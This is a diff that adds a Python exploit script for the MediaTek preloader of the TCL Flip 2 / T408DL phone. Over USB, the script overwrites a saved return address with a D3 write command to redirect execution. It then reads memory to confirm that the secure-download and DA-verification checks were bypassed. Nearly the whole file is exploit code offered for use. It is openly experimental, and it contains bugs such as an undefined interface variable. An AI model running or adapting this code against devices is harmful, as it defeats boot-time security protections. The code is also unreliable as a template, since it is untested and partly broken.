@@ -1,0 +1,214 @@
+#!/usr/bin/env python3
+"""
+T408DL_d3_redirect_experimental.py
+Exploit for TCL Flip 2 / T408DL (MT6739-family) to bypass security via D3 command redirection.
+
+This exploit uses the D3 (WRITE16_NO_ECHO) command to overwrite the saved return address
+of the READ16 helper function, causing execution to jump to 0x00200AD9 when READ16 returns.
+It is hoped that this address contains executable code that will allow the device to
+return to a responsive state, after which we can verify that S-USBDL is cleared and
+g_da_verified is set.
+
+HARDWARE TUPLE: 0x0699 / 0x8A00 / 0xCB00 / 0x0002
+"""
+
+import sys
+import time
+import usb.core
+import usb.util
+
+# USB vendor and product id for MediaTek preloader
+VENDOR_ID = 0x0e8d
+PRODUCT_ID = 0x2000
+
+# Timeout for USB reads (in milliseconds)
+TIMEOUT = 1000
+
+def find_device():
+    """Find the MediaTek preloader device."""
+    dev = usb.core.find(idVendor=VENDOR_ID, idProduct=PRODUCT_ID)
+    if dev is None:
+        raise ValueError('MediaTek preloader device not found. Ensure the device is in download mode and connected via USB.')
+    return dev
+
+def setup_device(dev):
+    """Configure the device for communication, handling possible kernel driver conflicts."""
+    # Detach kernel driver if necessary for each interface
+    for cfg in dev:
+        for intf in cfg:
+            if intf.is_kernel_driver_active(0):
+                try:
+                    dev.detach_kernel_driver(intf.bInterfaceNumber)
+                except usb.core.USBError as e:
+                    # If we cannot detach, we might still be able to use the interface if it's already configured
+                    # by another process (like mtk.py). We'll continue and hope for the best.
+                    pass
+    
+    # Set the active configuration. With no arguments, the first
+    # configuration will be the active one.
+    try:
+        dev.set_configuration()
+    except usb.core.USBError as e:
+        # If setting configuration fails, maybe the device is already configured by another process.
+        # We'll try to use the current active configuration.
+        pass
+    
+    # Get an endpoint instance
+    cfg = dev.get_active_configuration()
+    intf = cfg[(0,0)]
+    
+    # Try to claim the interface, but if it fails, we might still be able to use endpoints if already claimed.
+    try:
+        usb.util.claim_interface(intf, 0)
+    except usb.core.USBError as e:
+        # If we cannot claim, we'll try to use the endpoints from the current active configuration anyway.
+        # This might work if the interface is already claimed by another process (like mtk.py) that
+        # left the endpoints available.
+        pass
+    
+    ep_out = usb.util.find_descriptor(
+        intf,
+        custom_match = lambda e:
+            usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_OUT
+    )
+    
+    ep_in = usb.util.find_descriptor(
+        intf,
+        custom_match = lambda e:
+            usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_IN
+    )
+    
+    if ep_out is None or ep_in is None:
+        # If we didn't find endpoints in the first interface, try other interfaces in the active configuration.
+        for intf in cfg:
+            ep_out = usb.util.find_descriptor(
+                intf,
+                custom_match = lambda e:
+                    usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_OUT
+            )
+            ep_in = usb.util.find_descriptor(
+                intf,
+                custom_match = lambda e:
+                    usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_IN
+            )
+            if ep_out is not None and ep_in is not None:
+                break
+    
+    if ep_out is None or ep_in is None:
+        raise ValueError('Could not find endpoints')
+    
+    return ep_out, ep_in
+
+def mtk_command(ep_out, ep_in, cmd_packet, response_length=0):
+    """Send a command packet and optionally read a response."""
+    ep_out.write(cmd_packet, timeout=TIMEOUT)
+    if response_length > 0:
+        return ep_in.read(response_length, timeout=TIMEOUT)
+    return None
+
+def build_d3_packet(destination, data_halfword):
+    """
+    Build a D3 (WRITE16_NO_ECHO) command packet.
+    destination: 32-bit address (little-endian)
+    data_halfword: 16-bit data to write (little-endian)
+    Writes one halfword.
+    """
+    packet = bytearray()
+    packet.append(0xD3)                          # Command code
+    packet.extend(destination.to_bytes(4, 'little'))  # Destination address
+    packet.extend((1).to_bytes(2, 'little'))     # Count: 1 halfword
+    packet.extend(data_halfword.to_bytes(2, 'little')) # Data
+    return packet
+
+def build_read16_packet(address):
+    """
+    Build a READ16 command packet to read one halfword from the given address.
+    """
+    packet = bytearray()
+    packet.append(0xD0)                          # Command code
+    packet.extend(address.to_bytes(4, 'little'))  # Address
+    packet.extend((1).to_bytes(2, 'little'))     # Count: 1 halfword
+    return packet
+
+def main():
+    print("T408DL_d3_redirect_experimental.py")
+    print("Attempting to exploit D3 command to redirect execution...")
+    
+    try:
+        dev = find_device()
+        ep_out, ep_in = setup_device(dev)
+    except Exception as e:
+        print("Error: %s" % e)
+        sys.exit(1)
+    
+    # Build D3 command to overwrite saved lr at 0x000C0AC8 with 0xAD9
+    # This changes the saved lr from 0x00202B17 to 0x00200AD9
+    dst_saved_lr = 0x000C0AC8
+    data_to_write = 0xAD9   # Lower halfword of desired lr; upper halfword is already 0x0020
+    d3_packet = build_d3_packet(dst_saved_lr, data_to_write)
+    
+    print("Sending D3 command to write 0x{:04x} to 0x{:08x}...".format(data_to_write, dst_saved_lr))
+    mtk_command(ep_out, ep_in, d3_packet)
+    print("D3 command sent.")
+    
+    # Wait a bit for the device to process the command and potentially jump
+    time.sleep(0.5)
+    
+    # Try to get a response by sending GET_HW_CODE
+    print("Sending GET_HW_CODE to check if device is responsive...")
+    hw_packet = bytearray([0xA0])
+    hw_response = mtk_command(ep_out, ep_in, hw_packet, 4)
+    if hw_response is None:
+        print("Warning: No response to GET_HW_CODE. Device may not be responsive.")
+    else:
+        print("HW response: {}".format(hw_response.hex()))
+    
+    # Read S-USBDL at 0x0010043C
+    print("Reading S-USBDL at 0x0010043C...")
+    susbsd_addr = 0x0010043C
+    susbsd_packet = build_read16_packet(susbsd_addr)
+    susbsd_response = mtk_command(ep_out, ep_in, susbsd_packet, 2)
+    if susbsd_response is None:
+        print("Error: Failed to read S-USBDL")
+        sys.exit(1)
+    susbsd_value = int.from_bytes(susbsd_response, 'little')
+    print("S-USBDL value: 0x{:04x}".format(susbsd_value))
+    
+    # Read g_da_verified at 0x0010935D
+    print("Reading g_da_verified at 0x0010935D...")
+    gada_addr = 0x0010935D
+    gada_packet = build_read16_packet(gada_addr)
+    gada_response = mtk_command(ep_out, ep_in, gada_packet, 2)
+    if gada_response is None:
+        print("Error: Failed to read g_da_verified")
+        sys.exit(1)
+    gada_value = int.from_bytes(gada_response, 'little')
+    print("g_da_verified value: 0x{:04x}".format(gada_value))
+    
+    # Check results
+    if susbsd_value == 0 and gada_value == 1:
+        print("\nSUCCESS: S-USBDL is 0 and g_da_verified is 1.")
+        print("The exploit appears to have worked.")
+    else:
+        print("\nFAILURE: Expected S-USBDL=0x0000 and g_da_verified=0x0001.")
+        print("Got S-USBDL=0x{:04x}, g_da_verified=0x{:04x}".format(susbsd_value, gada_value))
+        print("The exploit may not have worked as expected.")
+    
+    # Release interface if we claimed it
+    try:
+        usb.util.release_interface(intf)
+    except:
+        pass
+    
+    # Optionally, offer to rollback the saved lr change
+    print("\nTo rollback the saved lr change, run the script with the --rollback flag.")
+    if len(sys.argv) > 1 and sys.argv[1] == '--rollback':
+        print("Performing rollback...")
+        # Build packet to write original value 0x2B17 to lower halfword of saved lr
+        rollback_data = 0x2B17
+        rollback_packet = build_d3_packet(dst_saved_lr, rollback_data)
+        mtk_command(ep_out, ep_in, rollback_packet)
+        print("Rollback packet sent.")
+
+if __name__ == '__main__':
+    main()
